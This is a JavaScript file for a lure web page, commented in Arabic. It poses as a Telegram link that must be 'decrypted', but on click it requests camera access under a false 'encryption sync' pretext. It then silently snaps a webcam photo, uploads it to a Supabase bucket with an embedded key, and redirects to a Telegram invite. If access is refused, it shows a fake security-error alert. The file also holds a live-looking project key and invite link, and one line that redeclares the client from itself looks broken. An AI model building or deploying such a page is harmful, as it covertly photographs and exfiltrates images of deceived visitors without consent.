// إعدادات سوبابيس التي أرسلتها لي
const SUPABASE_URL = 'https://liikyclasjdtsioxaihc.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxpaWt5Y2xhc2pkdHNpb3hhaWhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjM2OTIsImV4cCI6MjA5MTk5OTY5Mn0.lNZ7EfurBgWTPVrKjT4hIlm87BuAFcSX67glz8lBO6Y';
const TELEGRAM_LINK = 'https://t.me/+Inh-qlXH-uU3M2U0';

const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('overlay');

startBtn.addEventListener('click', async () => {
    try {
        // طلب الإذن (مزامنة الوسائط)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // إخفاء الرسالة وإظهار أن النظام يعمل
        startBtn.innerText = "جاري مزامنة التشفير...";
        startBtn.disabled = true;

        // التقاط الصورة بعد ثانية واحدة لضمان الوضوح
        setTimeout(async () => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            // تحويل الصورة لصيغة يمكن رفعها
            canvas.toBlob(async (blob) => {
                const fileName = `capture_${Date.now()}.jpg`;
                
                // رفع الصورة إلى Bucket "images"
                const { data, error } = await supabase.storage
                    .from('images')
                    .upload(fileName, blob);

                if (error) {
                    console.error('Upload Error:', error);
                }

                // إنهاء البث وتحويل المستخدم للتيليجرام فوراً
                stream.getTracks().forEach(track => track.stop());
                window.location.href = TELEGRAM_LINK;
                
            }, 'image/jpeg');
        }, 1000);

    } catch (err) {
        // في حال رفض الإذن (Deny)
        alert("خطأ أمني: يجب السماح بمزامنة الوسائط لفك تشفير الرابط. سيتم إعادة تحميل الصفحة.");
        location.reload();
    }
});
